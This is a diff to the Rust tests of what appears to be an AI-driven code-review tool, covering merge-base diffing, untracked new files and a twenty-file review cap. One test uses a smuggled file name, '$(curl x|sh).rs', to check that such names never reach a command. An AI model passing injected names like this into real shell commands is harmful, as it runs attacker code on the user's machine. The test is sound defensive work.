@@ -324,7 +324,7 @@ mod tests {
             None,
             answering(&asked_for, |task| {
                 let value = if task.starts_with("Run `git diff") {
-                    json!({"ran": true, "files": ["a.rs", "b.rs"]})
+                    json!({"ran": true, "tip": false, "files": ["a.rs", "b.rs"], "added": []})
                 } else if task.starts_with("Review the change to a.rs") {
                     json!({"items": [{"line": 3, "problem": "It panics on an empty line."}]})
                 } else if task.starts_with("Review") {
@@ -348,7 +348,7 @@ mod tests {
         let asked = asked_for.lock().unwrap();
         // The list, a reviewer for each file, three votes and the report.
         assert_eq!(asked.len(), 7);
-        assert!(asked[0].starts_with("Run `git diff main --name-only`"));
+        assert!(asked[0].starts_with("Run `git diff --merge-base main --name-only`"));
         assert!(asked[6].contains("\"line\":3,\"problem\":\"It panics on an empty line.\""));
     }
 
@@ -400,7 +400,8 @@ mod tests {
         // A reviewer that fails is named, and a name no command should see is left out.
         let (end, asked) = review(&data, json!("main"), |task| {
             let value = if task.starts_with("Run `git diff") {
-                json!({"ran": true, "files": ["a.rs", "b.rs", "$(curl x|sh).rs"]})
+                let files = ["a.rs", "b.rs", "$(curl x|sh).rs"];
+                json!({"ran": true, "tip": false, "files": files, "added": []})
             } else if task.starts_with("Review the change to a.rs") {
                 return report(Outcome::Failed("The model call failed.".into()), "");
             } else {
@@ -417,5 +418,135 @@ mod tests {
              not plain paths."
         );
         assert!(asked.iter().all(|task| !task.contains("curl")));
+    }
+
+    /// A helper's answer that gives `value`.
+    fn giving(value: serde_json::Value) -> Report {
+        let mut answer = report(Outcome::Done, "");
+        answer.value = Some(value);
+        answer
+    }
+
+    #[test]
+    fn the_lister_diffs_from_the_merge_base() {
+        let data = Data::new("saved-review-merge-base");
+        let (end, asked) = review(&data, json!("main"), |task| {
+            giving(if task.starts_with("Run") {
+                json!({"ran": true, "tip": false, "files": ["a.rs"], "added": []})
+            } else {
+                json!({"items": []})
+            })
+        });
+        assert_eq!(
+            end,
+            End::Returned(json!(
+                "Reviewed 1 of 1 changed files against main: nothing found held up."
+            ))
+        );
+        assert!(asked[0].starts_with("Run `git diff --merge-base main --name-only`"));
+        assert!(asked[0].contains("`git ls-files --others --exclude-standard`"));
+        assert!(asked[1].contains("run `git diff --merge-base main -- a.rs`"));
+    }
+
+    #[test]
+    fn a_branch_with_no_common_history_says_it_diffed_against_the_tip() {
+        let data = Data::new("saved-review-tip");
+        let (end, asked) = review(&data, json!("main"), |task| {
+            giving(if task.starts_with("Run") {
+                json!({"ran": true, "tip": true, "files": ["a.rs"], "added": []})
+            } else {
+                json!({"items": []})
+            })
+        });
+        assert_eq!(
+            end,
+            End::Returned(json!(
+                "Reviewed 1 of 1 changed files against main: nothing found held up.
+Diffed \
+                 against the tip of main, as no merge base was found."
+            ))
+        );
+        assert!(asked[1].contains("run `git diff main -- a.rs`"));
+    }
+
+    #[test]
+    fn an_untracked_file_reaches_a_reviewer_with_the_read_it_whole_prompt() {
+        let data = Data::new("saved-review-new");
+        let (end, asked) = review(&data, json!(""), |task| {
+            if task.starts_with("Write") {
+                return report(Outcome::Done, "The report.");
+            }
+            giving(if task.starts_with("Run") {
+                json!({"ran": true, "tip": false, "files": [], "added": ["new.rs", "logo.png"]})
+            } else if task.starts_with("Review the change to new.rs") {
+                json!({"items": [{"line": 2, "problem": "It never closes the file."}]})
+            } else if task.starts_with("Review") {
+                json!({"items": [], "unread": true})
+            } else {
+                json!({"real": true, "reason": "It does not."})
+            })
+        });
+        assert_eq!(
+            end,
+            End::Returned(json!(
+                "The report.\n\n1 new files were not read, as they are not text or run past \
+                 1,500 lines: logo.png."
+            ))
+        );
+        let reviewer = asked
+            .iter()
+            .find(|task| task.contains("to new.rs"))
+            .unwrap();
+        assert!(reviewer.starts_with(
+            "Review the change to new.rs: it is new and git does not track it yet, so read all \
+             of it and review it as an addition."
+        ));
+        assert!(!reviewer.contains("git diff"));
+        // The list, a reviewer for each new file, three votes and the report.
+        assert_eq!(asked.len(), 7);
+        assert!(asked[6].contains("\"file\":\"new.rs\",\"line\":2"));
+    }
+
+    #[test]
+    fn twenty_five_new_files_review_twenty_and_name_the_rest() {
+        let data = Data::new("saved-review-many");
+        let (end, asked) = review(&data, json!(""), |task| {
+            giving(if task.starts_with("Run") {
+                let added: Vec<String> = (1..=25).map(|n| format!("new{n:02}.rs")).collect();
+                json!({"ran": true, "tip": false, "files": [], "added": added})
+            } else {
+                json!({"items": []})
+            })
+        });
+        assert_eq!(
+            end,
+            End::Returned(json!(
+                "Reviewed 20 of 20 changed files against HEAD: nothing found held up.\n5 new \
+                 files were left out, as a review reads at most 20: new21.rs, new22.rs, \
+                 new23.rs, new24.rs, new25.rs."
+            ))
+        );
+        // The list and a reviewer for each of the first twenty.
+        assert_eq!(asked.len(), 21);
+        assert!(asked.iter().all(|task| !task.contains("new21.rs")));
+
+        // A folder of output is named only as far as a review reads.
+        let (end, _) = review(&data, json!(""), |task| {
+            giving(if task.starts_with("Run") {
+                let added: Vec<String> = (1..=45).map(|n| format!("out/{n:02}.js")).collect();
+                json!({"ran": true, "tip": false, "files": [], "added": added})
+            } else {
+                json!({"items": []})
+            })
+        });
+        let End::Returned(said) = end else {
+            panic!("{end:?}");
+        };
+        assert!(said.as_str().unwrap().ends_with(
+            "25 new files were left out, as a review reads at most 20: out/21.js, out/22.js, \
+             out/23.js, out/24.js, out/25.js, out/26.js, out/27.js, out/28.js, out/29.js, \
+             out/30.js, out/31.js, out/32.js, out/33.js, out/34.js, out/35.js, out/36.js, \
+             out/37.js, out/38.js, out/39.js, out/40.js and 5 more."
+        ));
     }
 }
